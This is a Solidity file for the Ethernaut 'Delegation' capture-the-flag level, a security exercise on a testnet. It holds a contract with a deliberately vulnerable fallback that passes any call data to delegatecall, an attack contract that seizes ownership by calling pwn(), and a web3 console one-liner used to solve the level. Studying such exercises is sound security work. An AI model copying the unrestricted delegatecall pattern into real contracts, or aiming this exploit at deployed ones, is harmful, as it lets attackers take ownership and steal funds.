// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// exercise code updated for > 0.8.0 solc
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}


// solution used by unit test
// see https://solidity-by-example.org/hacks/delegatecall/
// delegatecall https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-and-libraries
// fallback funtion https://docs.soliditylang.org/en/develop/contracts.html#fallback-function
// ABI https://docs.soliditylang.org/en/latest/abi-spec.html
// encoding functions https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=abi.encodeWithSignature#abi-encoding-and-decoding-functions
//
// call Delegation with a function selector that matches Delegate.pwn()
// Delegation has no matching function so its fallback() function gets called,
// which uses delegatecall to execute Delegate.pwn() (our matching function selector)
// with the state of Delegation. Hence Delegate.pwn() changes Delegation.owner
// to address of DelegationAttack contract (msg.sender)
contract DelegationAttack {

  Delegation delegation;

  constructor(address _delegation) {
    delegation =  Delegation(_delegation);
  }

  function attack() public returns(bool) {
    (bool result, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
    return result;
  }
}


// solution used to deploy live to testnet
// attack contract doesn't work to pass level as contrat must be owned by
// user address, not attack contract address
// so used following line in browser web3 console:
// contract.sendTransaction({data: web3.utils.keccak256("pwn()").substr(0, 10)})
